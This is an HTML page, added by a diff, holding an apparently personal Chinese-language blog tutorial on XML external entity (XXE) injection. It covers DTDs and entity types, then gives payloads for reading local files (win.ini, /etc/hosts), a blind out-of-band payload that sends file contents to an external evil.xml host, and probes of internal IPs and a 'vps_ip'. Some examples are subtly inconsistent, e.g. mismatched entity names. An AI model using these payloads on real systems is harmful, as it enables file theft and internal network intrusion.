@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		
+		<meta name="author" content="ifish">
+		
+		<meta name="generator" content="Hugo 0.45.1" />
+		<title>xxe &middot; if1sh</title>
+		<link rel="shortcut icon" href="https://ifishzz.github.io//images/favicon.ico">
+		<link rel="stylesheet" href="https://ifishzz.github.io//css/style.css">
+		<link rel="stylesheet" href="https://ifishzz.github.io//css/highlight.css">
+
+		
+		<link rel="stylesheet" href="https://ifishzz.github.io//css/font-awesome.min.css">
+		
+
+		
+
+		
+	</head>
+
+    <body>
+       <nav class="main-nav">
+	
+	
+		<a href='https://ifishzz.github.io/'> <span class="arrow">←</span>Home</a>
+	
+	<a href='https://ifishzz.github.io//posts'>Archive</a>
+	<a href='https://ifishzz.github.io//tags'>Tags</a>
+	<a href='https://ifishzz.github.io//categories'>Cate</a>
+
+	<a href='https://ifishzz.github.io//about'>About</a>
+
+	
+
+	
+	<a class="cta" href="https://ifishzz.github.io/index.xml">Subscribe</a>
+	
+</nav>
+
+
+        <section id="wrapper" class="post">
+            <article>
+                <header>
+                    <h1>
+                        xxe
+                    </h1>
+                    <h2 class="headline">
+                    Jan 24, 2018 00:00
+                    · 1731 words
+                    · 4 minute read
+                      <span class="tags">
+                      
+                      
+                          
+                              <a href="https://ifishzz.github.io//tags/xxe">xxe</a>
+                          
+                      
+                      
+                      </span>
+                    </h2>
+                </header>
+                
+                  
+                    <div id="toc">
+                      <nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li><a href="#0x00-xxe是什么">0x00 xxe是什么</a></li>
+<li><a href="#0x01-xml基础">0x01 xml基础</a>
+<ul>
+<li><a href="#dtd">DTD</a></li>
+<li><a href="#实体">实体</a></li>
+</ul></li>
+<li><a href="#能用xxe做什么">能用xxe做什么</a></li>
+<li><a href="#如何找到xxe">如何找到xxe</a></li>
+</ul></li>
+</ul>
+</nav>
+                    </div>
+                  
+                
+                <section id="post-body">
+                    
+
+<h2 id="0x00-xxe是什么">0x00 xxe是什么</h2>
+
+<p>xml外部实体注入</p>
+
+<h2 id="0x01-xml基础">0x01 xml基础</h2>
+
+<p>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素</p>
+
+<pre><code>&lt;!--XML申明--&gt;
+&lt;?xml version=&quot;1.0&quot;?&gt; 
+&lt;!--文档类型定义--&gt;
+&lt;!DOCTYPE note [  &lt;!--定义此文档是 note 类型的文档--&gt;
+&lt;!ELEMENT note (to,from,heading,body)&gt;  &lt;!--定义note元素有四个元素--&gt;
+&lt;!ELEMENT to (#PCDATA)&gt;     &lt;!--定义to元素为”#PCDATA”类型--&gt;
+&lt;!ELEMENT from (#PCDATA)&gt;   &lt;!--定义from元素为”#PCDATA”类型--&gt;
+&lt;!ELEMENT head (#PCDATA)&gt;   &lt;!--定义head元素为”#PCDATA”类型--&gt;
+&lt;!ELEMENT body (#PCDATA)&gt;   &lt;!--定义body元素为”#PCDATA”类型--&gt;
+]]]&gt;
+&lt;!--文档元素--&gt;
+&lt;note&gt;
+&lt;to&gt;Dave&lt;/to&gt;
+&lt;from&gt;Tom&lt;/from&gt;
+&lt;head&gt;Reminder&lt;/head&gt;
+&lt;body&gt;You are a good man&lt;/body&gt;
+&lt;/note&gt;
+</code></pre>
+
+<p>PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记</p>
+
+<p>CDATA 是不会被解析器解析的文本</p>
+
+<p>ENTITY 值是一个实体</p>
+
+<h3 id="dtd">DTD</h3>
+
+<p>文档类型定义（DTD）可定义合法的XML文档构建模块，它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于XML文档中（内部引用），也可作为一个外部引用。</p>
+
+<p>内部声明DTD:
+<code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></p>
+
+<p>引用外部DTD:
+<code>&lt;!DOCTYPE 根元素 SYSTEM &quot;存放元素声明的文件的URI，可以是本地文件或网络文件&quot; [可选的元素声明]&gt;</code></p>
+
+<p><code>&lt;!DOCTYPE 根元素 PUBLIC &quot;PUBLIC_ID DTD的名称&quot; &quot;外部DTD文件的URI&quot;&gt;</code></p>
+
+<p>（ PUBLIC表示 DTD文件是公共的，解析器先分析 DTD名称，没查到再去访问 URI）</p>
+
+<h3 id="实体">实体</h3>
+
+<p>实体可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值</p>
+
+<ul>
+<li>内置实体 (Built-in entities)</li>
+<li>字符实体 (Character entities)</li>
+<li>通用实体 (General entities)</li>
+<li>参数实体 (Parameter entities)</li>
+</ul>
+
+<p>参数实体用%实体名称申明，引用时也用%实体名称;其余实体直接用实体名称申明，引用时用&amp;实体名称。</p>
+
+<p>参数实体只能在DTD中申明，DTD中引用；其余实体只能在DTD中申明，可在xml文档中引用。</p>
+
+<p>&amp;普通实体名; //经实验，普通实体既可以在 DTD中，也可以在 XML中引用，可以在声明前引用，可以在在元素声明内部引用</p>
+
+<p>%参数实体名; //经实验，参数实体只能在 DTD中引用，不能在声明前引用,不能在元素声明内部引用</p>
+
+<p><em>最重要的是,外部实体引用</em></p>
+
+<p>通用实体:</p>
+
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
+&lt;!DOCTYPE data [
+    &lt;!ENTITY dtd SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt; 
+]&gt; 
+&lt;ifish&gt;  
+    &lt;lastname&gt;&amp;file;&lt;/lastname&gt;   
+&lt;/ifish&gt;
+</code></pre>
+
+<p>参数实体:</p>
+
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
+&lt;!DOCTYPE data [
+&lt;!ENTITY % dtd SYSTEM &quot;http://localhost:88/evil.xml&quot;&gt; 
+%dtd; %all; 
+]&gt; 
+&lt;value&gt;&amp;send;&lt;/value&gt;
+</code></pre>
+
+<p>evil.xml:</p>
+
+<pre><code> &lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM 'http://localhost:88%file;'&gt;&quot;&gt;
+</code></pre>
+
+<p>调用过程为：参数实体dtd调用外部实体evil.xml，然后又调用参数实体all，接着调用通用实体send,参数实体只能在DTD中调用</p>
+
+<p>不同程序支持的协议不同
+<img src="/images/xxe1.jpg" alt="" /></p>
+
+<p>上图是默认支持协议，还可以支持其他，如PHP支持的扩展协议有
+<img src="/images/xxe2.jpg" alt="" /></p>
+
+<h2 id="能用xxe做什么">能用xxe做什么</h2>
+
+<p>利用xxe漏洞可以进行拒绝服务攻击，文件读取，命令(代码)执行，SQL(XSS)注入，内外扫描端口，入侵内网站点等，内网探测和入侵是利用xxe中支持的协议进行内网主机和端口发现，可以理解是使用xxe进行SSRF的利用，基本上啥都能做了:-)</p>
+
+<p>一般xxe利用分为两大场景：有回显和无回显。有回显的情况可以直接在页面中看到Payload的执行结果或现象，无回显的情况又称为blind xxe，可以使用外带数据通道提取数据。</p>
+
+<h2 id="如何找到xxe">如何找到xxe</h2>
+
+<p>尝试注入特殊字符，使XML失效，引发解析异常，明确后端使用XML传输数据。</p>
+
+<ul>
+<li>单双引号 &lsquo; &ldquo; 。XML的属性值必须用引号包裹，而数据可能进入标签的属性值。</li>
+<li>尖括号&lt; &gt;。XML的开始/结束标签用尖括号包裹，数据中出现尖括号会引发异常。</li>
+<li>注释符 <!-- 。XML使用 <!-- This is a comment --> 作注释。</li>
+<li>&amp; 。&amp; 用于引用实体。</li>
+<li>CDATA 分隔符]]&gt; 。&lt;![CDATA[foo]]&gt; 中的内容不被parser解析，提前闭合引发异常。</li>
+</ul>
+
+<p>尝试利用实体和DTD。</p>
+
+<ul>
+<li>引用外部DTD文件访问内网主机/端口。&lt;!DOCTYPE a SYSTEM &ldquo;<a href="http://127.0.0.1:2333&quot;&gt;">http://127.0.0.1:2333&quot;&gt;</a> （看响应时间）</li>
+<li>引用外部DTD文件访问外网。&lt;!DOCTYPE a SYSTEM &ldquo;<a href="http://vps_ip&quot;">http://vps_ip&quot;</a> &gt;</li>
+<li>引用内部实体。&lt;!DOCTYPE a [&lt;!ENTITY xxe &ldquo;findneo&rdquo;&gt;]&gt;<a>&xxe;</a></li>
+<li>外部实体读本地文件。&lt;!DOCTYPE a [&lt;!ENTITY xxe SYSTEM &ldquo;file:///etc/hosts&rdquo;&gt;]&gt;<a>&xxe;</a></li>
+<li>外部实体访问内网主机/端口。&lt;!DOCTYPE a SYSTEM &ldquo;<a href="http://192.168.1.2:80&quot;&gt;（看响应时间）">http://192.168.1.2:80&quot;&gt;（看响应时间）</a></li>
+<li>外部实体访问外网。&lt;!DOCTYPE a [&lt;!ENTITY xxe SYSTEM &ldquo;<a href="http://vps_ip&quot;&gt;]&gt;">http://vps_ip&quot;&gt;]&gt;</a><a>&xxe;</a></li>
+<li>判断问题存在可以OOB提取数据。</li>
+</ul>
+
+                </section>
+            </article>
+
+            
+                
+
+            
+
+            
+
+            
+
+            <footer id="footer">
+    
+    
+    <p class="small">
+        Powered by <a href="http://www.gohugo.io/">Hugo</a> Theme By <a href="https://github.com/ifishzz">ifish</a>
+    </p>
+</footer>
+
+        </section>
+
+        <script src="https://ifishzz.github.io//js/jquery-3.3.1.min.js"></script>
+<script src="https://ifishzz.github.io//js/main.js"></script>
+<script src="https://ifishzz.github.io//js/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+
+
+
+  
+
+
+
+<script>
+var baiduAnalytics = '';
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?" + baiduAnalytics;
+  var s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+    </body>
+</html>
